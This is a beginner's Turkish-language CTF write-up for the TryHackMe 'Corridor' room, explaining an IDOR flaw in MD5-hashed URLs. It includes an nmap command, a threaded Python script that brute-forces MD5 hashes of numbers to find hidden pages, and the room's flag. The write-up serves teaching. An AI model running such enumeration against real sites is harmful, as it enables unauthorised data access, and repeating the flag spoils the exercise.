---

# TryHackMe: Corridor — IDOR Zafiyeti ve Python Otomasyonu

> **Room:** [Corridor](https://tryhackme.com/room/corridor)  
> **Difficulty:** Easy  
> **Category:** Web / IDOR  
> **Tools:** nmap, Python, requests, hashlib, concurrent.futures

---

## 🚩 FLAG

| Flag | Değer |
|------|-------|
| **Flag** | `flag{2477ef02448ad9156661ac40a6b8862e}` |

---

## Keşif (Reconnaissance)

Her zaman bir yeri hacklemeden önce keşif yapmak ve sistemi bilmek önceliktir. Bu yüzden hackinge NMAP ile başlıyoruz:

```bash
nmap -sV -sC -T4 <TARGET_IP>
```

**Sonuç:**

| PORT | STATE | SERVICE | VERSION |
|------|-------|---------|---------|
| 80/tcp | open | http | Werkzeug/Flask |

Sadece 80. port açık — Flask server. Başka port yok.

---

## Web Uygulaması Analizi

`http://<TARGET_IP>/` sitesini incelemek için gidiyoruz ve önümüze birden fazla kapı çıkıyor. Herhangi birine tıkladığımızda — fark etmesi zor olsa da — web sitesinin adresi şu şekilde değişiyor:

```
http://<TARGET_IP>/c4ca4238a0b923820dcc509a6f75849b
```

Sayfanın frontend'ini incelesek de bir şey çıkmadığına kanaat getiriyoruz ve **backend'e** bakıyoruz (`Ctrl+U`). 32 karakterlik hex hash içeren 13 adet `<area>` etiketi buldum. Desenin **MD5** olduğunu hemen fark ettim.

```html
<area shape="rect" coords="..." href="c4ca4238a0b923820dcc509a6f75849b">
```

---

## Otomasyon: Python Script

Aslında normal insanlar bunu terminalden halleder ama biz Python kullanacağız çünkü neden olmasın? Eğlenmek kötü değildir :D

**Neden Python?** Manuel test bazen yararlı olabilir ama zaman kazanmak için oluşturulan yazılımlar güçtür 💪. 13 kapı var, boundary değerlerini (0, negatifler, yüksek sayılar) tek tek denemek yavaş olur. Python scripti saniyeler içinde tüm olasılıkları test eder. Üstelik `concurrent.futures` ile multi-threading ekleyerek hızı katlıyoruz.

```python
import hashlib
import requests
import concurrent.futures

TARGET = "http://<TARGET_IP>"
START = 0
END = 50
THREADS = 10
TIMEOUT = 5

session = requests.Session()

def check(i):
    try:
        hash_val = hashlib.md5(str(i).encode()).hexdigest()
        url = f"{TARGET}/{hash_val}"
        r = session.get(url, timeout=TIMEOUT)

        if r.status_code == 200 and "flag" in r.text.lower():
            return i, url, r.text[:300]  # output limit
    except requests.RequestException:
        return None

with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
    futures = [executor.submit(check, i) for i in range(START, END)]

    for f in concurrent.futures.as_completed(futures):
        result = f.result()
        if result:
            i, url, content = result
            print(f"[+] FLAG FOUND at index {i}")
            print(f"[+] URL: {url}")
            print(content)
            executor.shutdown(wait=False, cancel_futures=True)
            break
```

---

## Exploitation

Scripti çalıştır:

```bash
python3 corridor_exploit.py
```

**Output:**
```
[+] FLAG FOUND at index 0
[+] URL: http://<TARGET_IP>/cfcd208495d565ef66e7dff9f98764da
```

Hmm... **0 numaralı oda** mevcuttu ancak ön uçtan gizlenmişti. Klasik bir **"off-by-one"** geliştirici hatası + **IDOR** güvenlik açığı.

---

## IDOR Nedir?

**Insecure Direct Object Reference (IDOR)** — uygulama, iç implementasyon nesnelerine (veritabanı anahtarı, dosya, dizin yolu) doğrudan referans verirken uygun erişim kontrolü uygulamadığında ortaya çıkar. Saldırgan bu referansları manipüle ederek yetkisiz verilere erişebilir.

Bu odada:
- **Direkt Referans:** MD5 hash'i oda numarası
- **Tahmin Edilebilir Desen:** `MD5(sayı)` formatı
- **Eksik Erişim Kontrolü:** 0. oda frontend'de gizli ama backend'de erişilebilir
- **Güvenlik Obscurity ile:** Hash'leme gerçek koruma sağlamıyor

---

## Öğrenilen Dersler

| Ana Nokta | Neden Önemli |
|-----------|--------------|
| Enumerasyonu otomatikleştir | Manuel testler bazı uç durumları kaçırabilir |
| Sınır değerlerini test et | 0 gibi değerler genellikle geliştiriciler tarafından unutulur |
| Hash ≠ güvenlik değildir | Ardışık sayılardan üretilen MD5 hash'leri kolayca tahmin edilebilir |
| Sayfa kaynağını incele | Frontend gizler, kaynak kod gerçeği gösterebilir |
| Multi-threading kullan | Hız kazan, zamanın değerli |

---

happy hacking! ( its my 3rd writeup Im just a beginner )
